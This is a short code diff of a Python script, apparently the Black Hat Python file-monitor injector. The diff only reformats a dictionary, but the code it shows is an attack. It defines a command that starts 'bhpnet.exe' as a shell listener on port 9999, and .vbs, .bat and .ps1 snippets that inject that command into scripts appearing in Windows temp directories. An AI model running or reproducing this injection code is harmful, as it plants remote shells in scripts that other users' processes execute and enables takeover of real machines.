@@ -10,16 +10,19 @@ dirs_to_monitor = ["C:\\WINDOWS\\Temp", tempfile.gettempdir()]
 # file modification constants
 FILE_CREATED = 1
 FILE_DELETED = 2
-FILE_MODIFIED = 3 
+FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
 
-# extension based code snippets to inject
-file_types = {}
 command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
-file_types[".vbs"] = ["\r\n'bhpmarker\r\n", "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command]
-file_types[".bat"] = ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command]
-file_types[".ps1"] = ["\r\n#bhpmarker", "Start-Process \"%s\"" % command]
+file_types = {
+    ".vbs": [
+        "\r\n'bhpmarker\r\n",
+        "\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" % command,
+    ],
+    ".bat": ["\r\nREM bhpmarker\r\n", "\r\n%s\r\n" % command],
+    ".ps1": ["\r\n#bhpmarker", "Start-Process \"%s\"" % command],
+}
 
 def inject_code(full_filename, extension, contents):
     # check if our marker is already in the file
